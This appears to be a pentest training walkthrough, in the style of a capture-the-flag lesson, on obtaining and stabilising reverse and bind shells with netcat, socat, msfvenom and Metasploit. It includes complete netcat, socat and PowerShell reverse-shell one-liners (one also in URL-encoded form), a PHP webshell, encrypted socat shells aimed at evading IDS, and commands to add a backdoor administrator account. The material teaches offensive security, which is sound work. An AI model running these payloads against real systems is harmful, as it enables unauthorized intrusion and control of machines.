# What the Shell?

## Description

An introduction to sending and receiving (reverse/bind) shells when exploiting target machines.
* Category: Walkthrough

## What is a shell?

In the simplest possible terms, shells are what we use when interfacing with a Command Line environment (CLI). In other words, the common `bash` or `sh` programs in Linux are examples of shells, as are `cmd.exe` and **Powershell** on Windows.

When targeting remote systems it is sometimes possible to force an application running on the server to execute arbitrary code. When this happens, we want to use this initial access to obtain a shell running on the target.

In simple terms, we can force the remote server to either send us command line access to the server (a reverse shell), or to open up a port on the server which we can connect to in order to execute further commands (a bind shell).

## Tools

There are a variety of tools that we will be using to receive reverse shells and to send bind shells. In general terms, we need malicious shell code, as well as a way of interfacing with the resulting shell.

### Netcat

**Netcat** is the traditional "Swiss Army Knife" of networking. It is used to manually perform all kinds of network interactions, including things like banner grabbing during enumeration, but more importantly for our uses, it can be used to receive reverse shells and connect to remote ports attached to bind shells on a target system. Netcat shells are very unstable (easy to lose) by default, but can be improved.

### Socat

**Socat** is like netcat on steroids. It can do all of the same things, and *many* more. Socat shells are usually more stable than netcat shells out of the box. In this sense it is vastly superior to netcat. However, there are two big catches:
* The syntax is more difficult
* Netcat is installed on virtually every Linux distribution by default. Socat is very rarely installed by default.

Both Socat and Netcat have `.exe` versions for use on Windows.

### Metasploit - multi/handler

The `exploit/multi/handler` module of the Metasploit framework is, like socat and netcat, used to receive reverse shells.

Due to being part of the Metasploit framework, `multi/handler` provides a fully-fledged way to obtain stable shells, with a wide variety of further options to improve the caught shell. It's also the only way to interact with a *meterpreter* shell, and is the easiest way to handle staged payloads.

### Msfvenom

Like `multi/handler`, `msfvenom` is technically part of the Metasploit Framework, however, it is shipped as a standalone tool. Msfvenom is used to generate payloads on the fly and it is an incredibly powerful tool.

---

Aside from the tools we've already covered, there are some repositories of shells in many different languages. One of the most prominent of these is ***Payloads all the Things***. The ***PentestMonkey Reverse Shell Cheatsheet*** is also commonly used. In addition to these online resources, Kali Linux also comes pre-installed with a variety of webshells located at `/usr/share/webshells`. The SecLists repo, though primarily used for wordlists, also contains some very useful code for obtaining shells.

## Types of Shell

At a high level, we are interested in two kinds of shell when it comes to exploiting a target:
* **Reverse shells** are when the target is forced to execute code that connects back to our computer. On our own computer we would set up a listener which would be used to receive the connection. Reverse shells are a good way to bypass firewall rules that may prevent us from connecting to arbitrary ports on the target. However, the drawback is that, when receiving a shell from a machine across the internet, we would need to configure our own network to accept the shell.
* **Bind shells** are when the code executed on the target is used to start a listener attached to a shell directly on the target. This would then be opened up to the internet, meaning we can connect to the port that the code has opened and obtain remote code execution that way. This has the advantage of not requiring any configuration on our own network, but may be prevented by firewalls protecting the target.

As a general rule, reverse shells are easier to execute and debug.

Shells can be either interactive or non-interactive.

Interactive shells allow us to interact with programs after executing them. Non-Interactive shells don't give us that luxury. In a non-interactive shell, we are limited to using programs which do not require user interaction in order to run properly. Unfortunately, the majority of simple reverse and bind shells are non-interactive, which can make further exploitation trickier.

## Netcat

Netcat is the most basic tool in a pentester's toolkit when it comes to any kind of networking. With it we can do a wide variety of interesting things, but let's focus for now on shells.

### Reverse Shells

Reverse shells require shellcode and a listener. There are many ways to execute a shell, so we'll start by looking at listeners.

The syntax for starting a netcat listener using Linux is: `nc -lvnp <port>`
* `-l` is used to tell netcat that this will be a listener
* `-v` is used to request a verbose output
* `-n` tells netcat not to resolve hostnames or use DNS
* `-p` indicates that the port specification will follow

### Bind Shells

If we are looking to obtain a bind shell on a target then we can assume that there is already a listener waiting for us on a chosen port of the target. All we need to do is connect to it. The syntax for this is relatively straight forward: `nc <target> <port>`

Here we are using netcat to make an outbound connection to the target on our chosen port.

## Netcat Shell Stabilisation

Netcat shells are very unstable by default. Pressing `Ctrl+C` kills the whole thing. They are non-interactive, and often have strange formatting errors. This is due to netcat "shells" really being processes running inside a terminal, rather than being bonafide terminals in their own right.

Fortunately, there are many ways to stabilise netcat shells on Linux systems. We'll be looking at three here. Stabilisation of Windows reverse shells tends to be significantly harder. However, the second technique that we'll be covering here is particularly useful for it.

### Technique 1: Python

This technique is applicable only to Linux as they will nearly always have Python installed by default. This is a 3 stage process:
1. The first thing to do is use `python -c 'import pty;pty.spawn("/bin/bash")'`, which uses Python to spawn a better featured bash shell. Some targets may need the version of Python specified. If this is the case, replace `python` with `python2` or `python3` as required. At this point our shell will look a bit prettier, but we still won't be able to use tab autocomplete or the arrow keys, and `Ctrl+C` will still kill the shell.
2. Step two is: `export TERM=xterm` as this will give us access to term commands such as clear.
3. Finally we will background the shell using `Ctrl+Z`. Back in our own terminal we use `stty raw -echo; fg`. This does two things: first, it turns off our own terminal echo (which gives us access to tab autocompletes, the arrow keys, and `Ctrl+C` to kill processes). It then foregrounds the shell, thus completing the process.

If the shell dies, any input in our own terminal will not be visible. To fix this, type `reset` and press enter.

### Technique 2: rlwrap

`rlwrap` is a program which, in simple terms, gives us access to history, tab autocompletion and the arrow keys immediately upon receiving a shell. However, some manual stabilisation must still be utilised if we want to be able to use `Ctrl+C` inside the shell.

To use rlwrap, we invoke a slightly different listener: `rlwrap nc -lvnp <port>`.

Prepending our netcat listener with `rlwrap` gives us a much more fully featured shell. This technique is particularly useful when dealing with Windows shells, which are otherwise notoriously difficult to stabilise. When dealing with a Linux target, it's possible to completely stabilise, by using the same trick as in step three of the previous technique.

### Technique 3: Socat

The third easy way to stabilise a shell is quite simply to use an initial netcat shell as a stepping stone into a more fully-featured socat shell. This technique is limited to Linux targets, as a Socat shell on Windows will be no more stable than a netcat shell.

To accomplish this method of stabilisation we would first transfer a socat static compiled binary (a version of the program compiled to have no dependencies) up to the target machine. A typical way to achieve this would be using a webserver on the attacking machine inside the directory containing our socat binary, then, on the target machine, using the netcat shell to download the file.

In a Windows CLI environment the same can be done with Powershell, using either `Invoke-WebRequest` or a webrequest system class, depending on the version of Powershell installed (`Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe`).

---

With any of the above techniques, it's useful to be able to change our terminal tty size. This is something that our terminal will do automatically when using a regular shell. However, it must be done manually in a reverse or bind shell if we want to use something like a text editor which overwrites everything on the screen.

## Socat

Socat is similar to netcat in some ways, but fundamentally different in many others. The easiest way to think about socat is as a connector between two points. All socat does is provide a link between two points much like the portal gun from the Portal games!

### Reverse Shells

As mentioned previously, the syntax for socat gets a lot harder than that of netcat. Here's the syntax for a basic reverse shell listener in socat: `socat TCP-L:<port> -`

As always with socat, this is taking two points (a listening port, and standard input) and connecting them together. The resulting shell is unstable, but this will work on either Linux or Windows and is equivalent to `nc -lvnp <port>`.

On Windows we would use this command to connect back: `socat TCP:<local-ip>:<port> EXEC:powershell.exe,pipes`.

The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.

This is the equivalent command for a Linux Target: `socat TCP:<local-ip>:<port> EXEC:"bash -li"`.

### Bind Shells

On a Linux target we would use the following command: `socat TCP-L:<port> EXEC:"bash -li"`

On a Windows target we would use this command for our listener: `socat TCP-L:<port> EXEC:powershell.exe,pipes`

We use the "pipes" argument to interface between the Unix and Windows ways of handling input and output in a CLI environment.

Regardless of the target, we use this command on our attacking machine to connect to the waiting listener: `socat TCP:<target-ip>:<port> -`

---

One of the most powerful uses for Socat: a fully stable Linux tty reverse shell. This will only work when the target is Linux, but is significantly more stable. Here is the new listener syntax: ``socat TCP-L:<port> FILE:`tty`,raw,echo=0``

As usual, we're connecting two points together. In this case those points are a listening port, and a file. Specifically, we are passing in the current TTY as a file and setting the echo to be zero. This is approximately equivalent to using the `Ctrl+Z`, `stty raw -echo; fg` trick with a netcat shell with the added bonus of being immediately stable and hooking into a full tty.

The first listener can be connected to with any payload. However, this special listener must be activated with a very specific socat command. This means that the target must have socat installed. Most machines do not have socat installed by default, however, it's possible to upload a precompiled socat binary, which can then be executed as normal.

The special command is as follows: `socat <local-ip>:<port> EXEC:"bash -li",pty,stderr,setsid,sigint,sane`

The first part is easy, we're linking up with the listener running on our own machine. The second part of the command creates an interactive bash session with `EXEC:"bash -li"`. We're also passing the arguments: pty, stderr, sigint, setsid and sane:
* `pty`, allocates a pseudo-terminal on the target
* `stderr`, makes sure that any error messages get shown in the shell
* `sigint`, passes any `Ctrl+C` commands through into the sub-process, allowing us to kill commands inside the shell
* `setsid`, create the process in a new session
* `sane`, stabilises the terminal, attempting to normalise it

## Socat Encrypted Shells

One of the many great things about socat is that it's capable of creating encrypted shells. Encrypted shells cannot be spied on unless we have the decryption key, and are often able to bypass an IDS as a result.

We first need to generate a certificate in order to use encrypted shells. This is easiest to do on our attacking machine: `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt`

This command creates a 2048 bit RSA key with matching cert file, self-signed, and valid for just under a year. When we run this command it will ask us to fill in information about the certificate. This can be left blank, or filled randomly.

We then need to merge the 2 created files into a single `.pem` file: `cat shell.key shell.crt > shell.pem`.

Now when we set up our reverse shell listener, we use: `socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 -`

This sets up an OPENSSL listener using our generated certificate. `verify=0` tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. The certificate must be used on whichever device is listening.

To connect back, we would use: `socat OPENSSL:<local-ip>:<port>,verify=0 EXEC:"/bin/bash"`

The same technique would apply to the bind shell.

On the target: `socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes`

On the attacking machine: `socat OPENSSL:<target-ip>:<port>,verify=0 -`

## Common Shell Payloads

In some versions of netcat (including the `nc.exe` Windows version included with Kali at `/usr/share/windows-resources/binaries`, and the version used in Kali itself: `netcat-traditional`) there is a `-e` option which allows us to execute a process on connection. For example, as a listener: `nc -lvnp <port> -e /bin/bash`. Connecting to the above listener with netcat would result in a bind shell on the target.

Equally, for a reverse shell, connecting back with `nc <LOCAL-IP> <PORT> -e /bin/bash` would result in a reverse shell on the target.

However, this is not included in most versions of netcat as it is widely seen to be very insecure. On Windows where a static binary is nearly always required anyway, this technique will work perfectly. On Linux, however, we would instead use this code to create a listener for a bind shell: `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`.

The command first creates a named pipe at `/tmp/f`. It then starts a netcat listener, and connects the input of the listener to the output of the named pipe. The output of the netcat listener then gets piped directly into `sh`, sending the stderr output stream into stdout, and sending stdout itself into the input of the named pipe, thus completing the circle.

A very similar command can be used to send a netcat reverse shell: `mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`.

This command is virtually identical to the previous one, other than using the netcat connect syntax, as opposed to the netcat listen syntax.

When targeting a modern Windows Server, it is very common to require a Powershell reverse shell. An extremely useful and standard one-liner PSH reverse shell is: `powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`.

In order to use this, we need to replace `<ip>` and `<port>` with an appropriate IP and choice of port. It can then be copied into a cmd.exe shell (or another method of executing commands on a Windows server, such as a webshell) and executed, resulting in a reverse shell.

For other common reverse shell payloads, ***PayloadsAllTheThings*** is a repository containing a wide range of shell codes (usually in one-liner format for copying and pasting), in many different languages.

## msfvenom

Msfvenom: the one-stop-shop for all things payload related.

Part of the Metasploit framework, msfvenom is used to generate code for primarily reverse and bind shells. It is used extensively in lower-level exploit development to generate hexadecimal shellcode when developing something like a Buffer Overflow exploit. However, it can also be used to generate payloads in various formats (e.g. `.exe`, `.aspx`, `.war`, `.py`).

The standard syntax for msfvenom is as follows: `msfvenom -p <PAYLOAD> <OPTIONS>`.

### Staged vs Stageless

Before we go any further, there are another two concepts which must be introduced:
* **Staged payloads** are sent in two parts. The first part is called the stager. This is a piece of code which is executed directly on the server itself. It connects back to a waiting listener, but doesn't actually contain any reverse shell code by itself. Instead it connects to the listener and uses the connection to load the real payload, executing it directly and preventing it from touching the disk where it could be caught by traditional anti-virus solutions. Thus the payload is split into two parts: a small initial stager, then the bulkier reverse shell code which is downloaded when the stager is activated. Staged payloads require a special listener usually the Metasploit `multi/handler`.
* **Stageless payloads** are more common. They are entirely self-contained in that there is one piece of code which, when executed, sends a shell back immediately to the waiting listener.

Stageless payloads tend to be easier to use and catch. However, they are also bulkier, and are easier for an antivirus or intrusion detection program to discover and remove.

Staged payloads are harder to use, but the initial stager is a lot shorter, and is sometimes missed by less-effective antivirus software. Modern day antivirus solutions will also make use of the Anti-Malware Scan Interface (AMSI) to detect the payload as it is loaded into memory by the stager, making staged payloads less effective than they would once have been in this area.

### Meterpreter

On the subject of Metasploit, another important thing to discuss is a Meterpreter shell. Meterpreter shells are Metasploit's own brand of fully-featured shell. They are completely stable, making them a very good thing when working with Windows targets. They also have a lot of inbuilt functionality of their own, such as file uploads and downloads.

If we want to use any of Metasploit's post-exploitation tools then we need to use a meterpreter shell. The downside to meterpreter shells is that they must be caught in Metasploit.

### Payload Naming Convention

When working with msfvenom, it's important to understand how the naming system works. The basic convention is as follows: `<OS>/<ARCH>/<PAYLOAD>`.

The exception to this convention is Windows 32bit targets. For these, the arch is not specified. For example: `windows/shell_reverse_tcp`.

For a 64bit Windows target, the arch would be specified as normal (x64).

The stageless payloads are denoted with underscores (`_`) while staged payloads are denoted with slashes (`/`). This rule also applies to Meterpreter payloads.

## Metasploit multi/handler

Multi/Handler is a superb tool for catching reverse shells. It's essential if we want to use Meterpreter shells, and is the go-to when using staged payloads.

Fortunately, this is relatively easy to use:
1. Start Metasploit with `msfconsole`.
2. Type `use exploit/multi/handler` and press enter.

There are three options we need to set: `payload`, `LHOST` and `LPORT`. These are all identical to the options we set when generating shellcode with Msfvenom. The `LHOST` must be specified here, as metasploit will not listen on all network interfaces like netcat or socat will, it must be told a specific address to listen with. We set these options with the following commands:
* `set PAYLOAD <payload>`
* `set LHOST <local-ip>`
* `set LPORT <port>`

We should now be ready to start the listener! We can start the listener using `exploit -j` as this will tell Metasploit to run the exploit as a job in the background.

Because the multi/handler was originally backgrounded, we need to use `sessions` command to be able to interact with the shell again.

## WebShells

There are times when we encounter websites that allow us an opportunity to upload, in some way or another, an executable file. Ideally we would use this opportunity to upload code that would activate a reverse or bind shell, but sometimes this is not possible. In these cases we would instead upload a webshell.

"Webshell" is a colloquial term for a script that runs inside a webserver (usually in a language such as PHP or ASP) which executes code on the server. Essentially, commands are entered into a webpage either through a HTML form or directly as arguments in the URL, which are then executed by the script, with the results returned and written to the page. This can be extremely useful if there are firewalls in place, or even just as a stepping stone into a fully fledged reverse or bind shell.

Here is a basic one-liner PHP webshell: `<?php echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>"; ?>`.

This will take a GET parameter in the URL and execute it on the system with `shell_exec()`. Essentially, what this means is that any commands we enter in the URL after `?cmd=` will be executed on the system. The "pre" elements are to ensure that the results are formatted correctly on the page.

When the target is Windows, it is often easiest to obtain RCE using a web shell, or by using msfvenom to generate a reverse/bind shell in the language of the server. With the former method, obtaining RCE is often done with a URL Encoded Powershell Reverse Shell. This would be copied into the URL as the `cmd` argument:

```bash
powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27<IP>%27%2C<PORT>%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

This is a URL encoded version of the Powershell reverse shell we discussed earlier.

## Next Steps

We've covered lots of ways to generate, send and receive shells. The one thing that these all have in common is that they tend to be unstable and non-interactive. Even Unix style shells which are easier to stabilise are not ideal.

On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at `/home/<user>/.ssh` are often an ideal way to do this. In CTFs it's also not infrequent to find credentials lying around somewhere on the box.

Some exploits will also allow us to add our own account. In particular something like **Dirty C0w** or a writeable `/etc/shadow` or `/etc/passwd` would quickly give us SSH access to the machine, assuming SSH is open.

On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml` or `C:\xampp\FileZilla Server\FileZilla Server.xml`. These can be MD5 hashes or in plaintext, depending on the version.

Ideally on Windows we would obtain a shell running as the `SYSTEM` user, or an administrator account running with high privileges. In such a situation it's possible to simply add our own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.

The syntax for this is as follows: `net user <username> <password> /add` and `net localgroup administrators <username> /add`.

Reverse and Bind shells are an essential technique for gaining remote code execution on a machine, however, they will never be as fully featured as a native shell. Ideally we always want to escalate into using a "normal" method for accessing the machine, as this will invariably be easier to use for further exploitation of the target.